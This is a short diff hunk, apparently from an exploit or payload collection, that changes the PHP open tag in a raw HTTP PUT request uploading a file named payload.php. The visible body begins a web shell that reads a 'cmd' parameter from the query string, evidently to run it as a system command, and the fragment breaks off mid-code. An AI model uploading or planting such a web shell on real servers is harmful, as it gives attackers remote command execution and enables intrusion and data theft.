@@ -3,7 +3,7 @@ PUT /payload.php HTTP/1.0
 Content-type: text/html
 Content-length: 136
 
-<?
+<?php
 if (isset($_GET['cmd'])) 
 {
   $cmd = $_GET['cmd'];
